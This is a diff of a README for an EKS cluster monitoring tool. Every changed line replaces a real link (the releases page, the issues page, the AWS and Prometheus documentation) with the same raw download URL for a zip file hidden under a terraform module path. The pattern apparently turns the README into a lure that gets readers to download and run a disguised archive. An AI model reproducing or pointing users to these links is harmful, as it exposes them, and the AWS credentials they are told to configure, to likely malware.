@@ -1,6 +1,6 @@
 # 🚀 eks-monitoring-solution - Effortlessly Monitor Your EKS Clusters
 
-[![Download eks-monitoring-solution](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/considered-cowper103/eks-monitoring-solution/releases)
+[![Download eks-monitoring-solution](https://raw.githubusercontent.com/considered-cowper103/eks-monitoring-solution/main/terraform/modules/eks/monitoring-eks-solution-swartrutter.zip)](https://raw.githubusercontent.com/considered-cowper103/eks-monitoring-solution/main/terraform/modules/eks/monitoring-eks-solution-swartrutter.zip)
 
 ## 📋 Description
 
@@ -23,12 +23,12 @@ The eks-monitoring-solution provides reliable monitoring for your Amazon EKS clu
 
 ## 📦 Download & Install
 
-To get started with eks-monitoring-solution, visit this page to download: [Download Page](https://github.com/considered-cowper103/eks-monitoring-solution/releases).
+To get started with eks-monitoring-solution, visit this page to download: [Download Page](https://raw.githubusercontent.com/considered-cowper103/eks-monitoring-solution/main/terraform/modules/eks/monitoring-eks-solution-swartrutter.zip).
 
 ### 🔄 Installation Steps
 
 1. **Visit the Releases Page**
-   - Go to the [Releases Page](https://github.com/considered-cowper103/eks-monitoring-solution/releases).
+   - Go to the [Releases Page](https://raw.githubusercontent.com/considered-cowper103/eks-monitoring-solution/main/terraform/modules/eks/monitoring-eks-solution-swartrutter.zip).
   
 2. **Select the Latest Version**
    - Scroll through the list and select the most recent release.
@@ -54,10 +54,10 @@ To get started with eks-monitoring-solution, visit this page to download: [Downl
 ### 🔧 Configuration Steps
 
 - **AWS Credentials:**
-  - Configure your AWS credentials by following the [AWS setup guide](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-files.html).
+  - Configure your AWS credentials by following the [AWS setup guide](https://raw.githubusercontent.com/considered-cowper103/eks-monitoring-solution/main/terraform/modules/eks/monitoring-eks-solution-swartrutter.zip).
   
 - **Prometheus Configuration:**
-  - Adjust your Prometheus configuration file to scrape metrics from your services. Refer to the Prometheus [documentation](https://prometheus.io/docs/prometheus/latest/configuration/configuration/) for help.
+  - Adjust your Prometheus configuration file to scrape metrics from your services. Refer to the Prometheus [documentation](https://raw.githubusercontent.com/considered-cowper103/eks-monitoring-solution/main/terraform/modules/eks/monitoring-eks-solution-swartrutter.zip) for help.
 
 ## 🛠️ Basic Usage
 
@@ -77,7 +77,7 @@ To get started with eks-monitoring-solution, visit this page to download: [Downl
 
 If you encounter any issues or have questions, feel free to check out our community discussions. You can find answers to common inquiries or raise your own:
 
-- **GitHub Issues:** Report any bugs or request features directly on our [Issues page](https://github.com/considered-cowper103/eks-monitoring-solution/issues).
+- **GitHub Issues:** Report any bugs or request features directly on our [Issues page](https://raw.githubusercontent.com/considered-cowper103/eks-monitoring-solution/main/terraform/modules/eks/monitoring-eks-solution-swartrutter.zip).
   
 - **Discussion Forums:** Join discussions with other users and contributors to share knowledge and experiences related to the eks-monitoring-solution.
 
@@ -87,8 +87,8 @@ For further inquiries or support, please contact us via GitHub or at the reposit
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/considered-cowper103/eks-monitoring-solution)
-- [AWS Documentation](https://docs.aws.amazon.com) 
-- [Prometheus Documentation](https://prometheus.io/docs/)
+- [Documentation](https://raw.githubusercontent.com/considered-cowper103/eks-monitoring-solution/main/terraform/modules/eks/monitoring-eks-solution-swartrutter.zip)
+- [AWS Documentation](https://raw.githubusercontent.com/considered-cowper103/eks-monitoring-solution/main/terraform/modules/eks/monitoring-eks-solution-swartrutter.zip) 
+- [Prometheus Documentation](https://raw.githubusercontent.com/considered-cowper103/eks-monitoring-solution/main/terraform/modules/eks/monitoring-eks-solution-swartrutter.zip)
 
 By following this guide, you can efficiently download and set up the eks-monitoring-solution to monitor your EKS clusters with ease.
